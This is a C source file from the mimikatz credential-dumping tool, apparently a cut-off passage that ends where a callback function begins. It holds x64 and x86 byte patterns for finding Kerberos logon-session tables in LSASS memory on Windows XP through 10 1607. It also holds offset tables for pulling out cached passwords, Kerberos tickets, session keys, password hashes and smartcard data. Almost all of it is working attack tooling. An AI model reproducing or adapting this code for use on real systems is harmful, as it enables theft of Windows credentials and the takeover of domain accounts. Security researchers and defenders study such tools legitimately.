/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_sekurlsa_kerberos.h"
#ifdef _M_X64
BYTE PTRN_WALL_KerbFreeLogonSessionList[]	= {0x48, 0x3b, 0xfe, 0x0f, 0x84};
BYTE PTRN_WALL_KerbUnloadLogonSessionTable[]= {0x48, 0x8b, 0x18, 0x48, 0x8d, 0x0d};
KULL_M_PATCH_GENERIC KerberosReferences[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WALL_KerbFreeLogonSessionList),	PTRN_WALL_KerbFreeLogonSessionList},	{0, NULL}, {-4, 0}},
	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_KerbFreeLogonSessionList),	PTRN_WALL_KerbFreeLogonSessionList},	{0, NULL}, {-4, 1}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 2}},
	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 3}},
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 4}},
	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 5}},
	{KULL_M_WIN_BUILD_10_1511,	{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 6}},
	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 7}},
};
#elif defined _M_IX86
BYTE PTRN_WALL_KerbReferenceLogonSession[]	= {0x8B, 0x7D, 0x08, 0x8B, 0x17, 0x39, 0x50};
BYTE PTRN_WNO8_KerbUnloadLogonSessionTable[]= {0x53, 0x8b, 0x18, 0x50, 0x56};
BYTE PTRN_WIN8_KerbUnloadLogonSessionTable[]= {0x57, 0x8b, 0x38, 0x50, 0x68};
BYTE PTRN_WI10_KerbUnloadLogonSessionTable[]= {0x56, 0x8b, 0x30, 0x50, 0x57};
KULL_M_PATCH_GENERIC KerberosReferences[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WALL_KerbReferenceLogonSession),	PTRN_WALL_KerbReferenceLogonSession},	{0, NULL}, {-8, 0}},
	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_KerbReferenceLogonSession),	PTRN_WALL_KerbReferenceLogonSession},	{0, NULL}, {-8, 1}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WNO8_KerbUnloadLogonSessionTable),	PTRN_WNO8_KerbUnloadLogonSessionTable}, {0, NULL}, {-11,2}},
	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WNO8_KerbUnloadLogonSessionTable),	PTRN_WNO8_KerbUnloadLogonSessionTable}, {0, NULL}, {-11,3}},
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN8_KerbUnloadLogonSessionTable),	PTRN_WIN8_KerbUnloadLogonSessionTable}, {0, NULL}, {-14,4}},
	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WI10_KerbUnloadLogonSessionTable),	PTRN_WI10_KerbUnloadLogonSessionTable}, {0, NULL}, {-15,4}},
	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WI10_KerbUnloadLogonSessionTable),	PTRN_WI10_KerbUnloadLogonSessionTable}, {0, NULL}, {-15,5}},
	{KULL_M_WIN_BUILD_10_1511,	{sizeof(PTRN_WI10_KerbUnloadLogonSessionTable),	PTRN_WI10_KerbUnloadLogonSessionTable}, {0, NULL}, {-15,7}},
};
#endif

PVOID KerbLogonSessionListOrTable = NULL;
LONG KerbOffsetIndex = 0;

const KERB_INFOS kerbHelper[] = {
	{
		sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_51, LocallyUniqueIdentifier),
		sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_51, credentials),
		{
			sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_51, Tickets_1),
			sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_51, Tickets_2),
			sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_51, Tickets_3),
		},
		sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_51, SmartcardInfos),
		sizeof(LIST_ENTRY) + sizeof(KIWI_KERBEROS_LOGON_SESSION_51),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, ServiceName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, TargetName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, DomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, TargetDomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, Description),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, AltTargetDomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, ClientName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, TicketFlags),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, KeyType),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, Key),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, StartTime),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, EndTime),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, RenewUntil),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, TicketEncType),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, Ticket),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, TicketKvno),
		sizeof(KIWI_KERBEROS_INTERNAL_TICKET_51),
		sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_51, pKeyList),
		sizeof(KIWI_KERBEROS_KEYS_LIST_5),
		FIELD_OFFSET(KERB_HASHPASSWORD_5, generic),
		sizeof(KERB_HASHPASSWORD_5),
		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_5, CspDataLength),
		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_5, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO_5, nCardNameOffset),
		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_5, CspData),
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_51, credentials) + FIELD_OFFSET(KIWI_GENERIC_PRIMARY_CREDENTIAL, Password),
		sizeof(KIWI_GENERIC_PRIMARY_CREDENTIAL) - FIELD_OFFSET(KIWI_GENERIC_PRIMARY_CREDENTIAL, Password)
	},
	{
		sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, LocallyUniqueIdentifier),
		sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, credentials),
		{
			sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, Tickets_1),
			sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, Tickets_2),
			sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, Tickets_3),
		},
		sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, SmartcardInfos),
		sizeof(LIST_ENTRY) + sizeof(KIWI_KERBEROS_LOGON_SESSION),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, ServiceName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, TargetName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, DomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, TargetDomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, Description),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, AltTargetDomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, ClientName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, TicketFlags),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, KeyType),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, Key),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, StartTime),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, EndTime),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, RenewUntil),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, TicketEncType),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, Ticket),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, TicketKvno),
		sizeof(KIWI_KERBEROS_INTERNAL_TICKET_52),
		sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, pKeyList),
		sizeof(KIWI_KERBEROS_KEYS_LIST_5),
		FIELD_OFFSET(KERB_HASHPASSWORD_5, generic),
		sizeof(KERB_HASHPASSWORD_5),
		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_5, CspDataLength),
		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_5, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO_5, nCardNameOffset),
		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_5, CspData),
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, credentials) + FIELD_OFFSET(KIWI_GENERIC_PRIMARY_CREDENTIAL, Password),
		sizeof(KIWI_GENERIC_PRIMARY_CREDENTIAL) - FIELD_OFFSET(KIWI_GENERIC_PRIMARY_CREDENTIAL, Password)
	},
	{
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, LocallyUniqueIdentifier),
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, credentials),
		{
			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, Tickets_1),
			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, Tickets_2),
			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, Tickets_3),
		},
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, SmartcardInfos),
		sizeof(KIWI_KERBEROS_LOGON_SESSION),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_60, ServiceName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_60, TargetName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_60, DomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_60, TargetDomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_60, Description),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_60, AltTargetDomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_60, ClientName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_60, TicketFlags),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_60, KeyType),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_60, Key),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_60, StartTime),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_60, EndTime),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_60, RenewUntil),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_60, TicketEncType),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_60, Ticket),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_60, TicketKvno),
		sizeof(KIWI_KERBEROS_INTERNAL_TICKET_60),
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, pKeyList),
		sizeof(KIWI_KERBEROS_KEYS_LIST_6),
		FIELD_OFFSET(KERB_HASHPASSWORD_6, generic),
		sizeof(KERB_HASHPASSWORD_6),
		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_60, CspDataLength),
		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_60, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO, nCardNameOffset),
		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_60, CspData),
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, credentials) + FIELD_OFFSET(KIWI_GENERIC_PRIMARY_CREDENTIAL, Password),
		sizeof(KIWI_GENERIC_PRIMARY_CREDENTIAL) - FIELD_OFFSET(KIWI_GENERIC_PRIMARY_CREDENTIAL, Password)
	},
	{
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, LocallyUniqueIdentifier),
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, credentials),
		{
			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, Tickets_1),
			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, Tickets_2),
			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, Tickets_3),
		},
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, SmartcardInfos),
		sizeof(KIWI_KERBEROS_LOGON_SESSION),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, ServiceName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, TargetName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, DomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, TargetDomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, Description),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, AltTargetDomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, ClientName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, TicketFlags),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, KeyType),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, Key),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, StartTime),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, EndTime),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, RenewUntil),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, TicketEncType),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, Ticket),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, TicketKvno),
		sizeof(KIWI_KERBEROS_INTERNAL_TICKET_6),
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, pKeyList),
		sizeof(KIWI_KERBEROS_KEYS_LIST_6),
		FIELD_OFFSET(KERB_HASHPASSWORD_6, generic),
		sizeof(KERB_HASHPASSWORD_6),
		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_60, CspDataLength),
		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_60, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO, nCardNameOffset),
		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_60, CspData),
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, credentials) + FIELD_OFFSET(KIWI_GENERIC_PRIMARY_CREDENTIAL, Password),
		sizeof(KIWI_GENERIC_PRIMARY_CREDENTIAL) - FIELD_OFFSET(KIWI_GENERIC_PRIMARY_CREDENTIAL, Password),
	},
	{
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, LocallyUniqueIdentifier),
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, credentials),
		{
			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, Tickets_1),
			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, Tickets_2),
			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, Tickets_3),
		},
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, SmartcardInfos),
		sizeof(KIWI_KERBEROS_LOGON_SESSION),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, ServiceName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, TargetName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, DomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, TargetDomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, Description),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, AltTargetDomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, ClientName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, TicketFlags),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, KeyType),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, Key),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, StartTime),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, EndTime),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, RenewUntil),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, TicketEncType),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, Ticket),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, TicketKvno),
		sizeof(KIWI_KERBEROS_INTERNAL_TICKET_6),
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, pKeyList),
		sizeof(KIWI_KERBEROS_KEYS_LIST_6),
		FIELD_OFFSET(KERB_HASHPASSWORD_6, generic),
		sizeof(KERB_HASHPASSWORD_6),
		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_62, CspDataLength),
		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_62, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO, nCardNameOffset),
		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_62, CspData),
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, credentials) + FIELD_OFFSET(KIWI_GENERIC_PRIMARY_CREDENTIAL, Password),
		sizeof(KIWI_GENERIC_PRIMARY_CREDENTIAL) - FIELD_OFFSET(KIWI_GENERIC_PRIMARY_CREDENTIAL, Password)
	},
	{
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, LocallyUniqueIdentifier),
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, credentials),
		{
			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, Tickets_1),
			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, Tickets_2),
			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, Tickets_3),
		},
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, SmartcardInfos),
		sizeof(KIWI_KERBEROS_LOGON_SESSION_10),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, ServiceName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, TargetName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, DomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, TargetDomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, Description),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, AltTargetDomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, ClientName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, TicketFlags),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, KeyType),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, Key),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, StartTime),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, EndTime),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, RenewUntil),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, TicketEncType),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, Ticket),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, TicketKvno),
		sizeof(KIWI_KERBEROS_INTERNAL_TICKET_6),
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, pKeyList),
		sizeof(KIWI_KERBEROS_KEYS_LIST_6),
		FIELD_OFFSET(KERB_HASHPASSWORD_6, generic),
		sizeof(KERB_HASHPASSWORD_6),
		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, CspDataLength),
		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO, nCardNameOffset),
		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, CspData),
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, credentials) + FIELD_OFFSET(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL, unk0),
		sizeof(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL) - FIELD_OFFSET(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL, unk0)
	},
	{
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, LocallyUniqueIdentifier),
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, credentials),
		{
			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, Tickets_1),
			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, Tickets_2),
			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, Tickets_3),
		},
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, SmartcardInfos),
		sizeof(KIWI_KERBEROS_LOGON_SESSION_10),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10, ServiceName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10, TargetName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10, DomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10, TargetDomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10, Description),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10, AltTargetDomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10, ClientName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10, TicketFlags),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10, KeyType),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10, Key),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10, StartTime),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10, EndTime),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10, RenewUntil),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10, TicketEncType),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10, Ticket),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10, TicketKvno),
		sizeof(KIWI_KERBEROS_INTERNAL_TICKET_10),
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, pKeyList),
		sizeof(KIWI_KERBEROS_KEYS_LIST_6),
		FIELD_OFFSET(KERB_HASHPASSWORD_6, generic),
		sizeof(KERB_HASHPASSWORD_6),
		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, CspDataLength),
		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO, nCardNameOffset),
		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, CspData),
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, credentials) + FIELD_OFFSET(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL, unk0),
		sizeof(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL) - FIELD_OFFSET(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL, unk0)
	},
	{
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_1607, LocallyUniqueIdentifier),
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_1607, credentials),
		{
			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_1607, Tickets_1),
			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_1607, Tickets_2),
			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_1607, Tickets_3),
		},
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_1607, SmartcardInfos),
		sizeof(KIWI_KERBEROS_LOGON_SESSION_10_1607),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, ServiceName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, TargetName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, DomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, TargetDomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, Description),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, AltTargetDomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, ClientName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, TicketFlags),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, KeyType),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, Key),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, StartTime),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, EndTime),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, RenewUntil),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, TicketEncType),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, Ticket),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, TicketKvno),
		sizeof(KIWI_KERBEROS_INTERNAL_TICKET_10_1607),
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_1607, pKeyList),
		sizeof(KIWI_KERBEROS_KEYS_LIST_6),
		FIELD_OFFSET(KERB_HASHPASSWORD_6_1607, generic),
		sizeof(KERB_HASHPASSWORD_6_1607),
		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, CspDataLength),
		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO, nCardNameOffset),
		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, CspData),
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_1607, credentials) + FIELD_OFFSET(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607, unkFunction),
		sizeof(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607) - FIELD_OFFSET(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607, unkFunction)
	},
};

KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_kerberos_package = {L"kerberos", kuhl_m_sekurlsa_enum_logon_callback_kerberos, TRUE, L"kerberos.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
const PKUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_kerberos_single_package[] = {&kuhl_m_sekurlsa_kerberos_package};

NTSTATUS kuhl_m_sekurlsa_kerberos(int argc, wchar_t * argv[])
{
	return kuhl_m_sekurlsa_getLogonData(kuhl_m_sekurlsa_kerberos_single_package, 1);
}

void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_kerberos(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
